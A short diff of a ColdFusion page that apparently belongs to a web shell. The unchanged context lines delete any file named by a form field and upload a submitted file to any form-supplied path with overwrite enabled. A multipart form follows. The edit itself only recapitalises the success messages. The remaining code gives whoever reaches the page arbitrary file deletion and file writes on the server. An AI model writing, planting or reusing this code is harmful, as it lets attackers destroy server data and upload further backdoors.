@@ -3,11 +3,11 @@
 
 <CFCASE VALUE="delete">
 <CFFILE ACTION="Delete" FILE="#Form.path#">
-delete success
+Delete Success
 </CFCASE>
 <CFCASE VALUE="upload">
 <CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">
-upload success
+Upload Success
 </CFCASE>
 <CFDEFAULTCASE>
 <FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
